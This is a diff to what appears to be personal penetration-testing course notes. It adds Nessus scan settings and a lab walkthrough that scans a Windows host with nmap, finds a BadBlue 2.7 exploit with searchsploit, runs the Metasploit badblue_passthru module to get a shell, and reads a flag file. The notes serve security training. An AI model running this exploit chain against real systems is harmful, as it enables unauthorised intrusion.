@@ -409,13 +409,31 @@ exploit
 ```
 **Assessment Methodologies: Vulnerability Assessment**
 
-24)  
+24)  Nessus
+
+```
+https://localhost:8834/
+DISCOVERY -> Port Scanning settings
+ASSESSMENT -> ** Web Applications** settings
+
+```
+25) Windows: Easy File Sharing Server  
+
+```
+cat Desktop/target
+nmap 10.0.29.29
+nmap -sV -p 80 10.0.29.29
+searchsploit Badblue 2.7
+use exploit/windows/http/badblue_passthru
+set RHOSTS 10.0.29.29
+shell
+run
+dir
+type flag.txt
 
 ```
 
-```
-
-25)  
+26)  
 
 ```
 
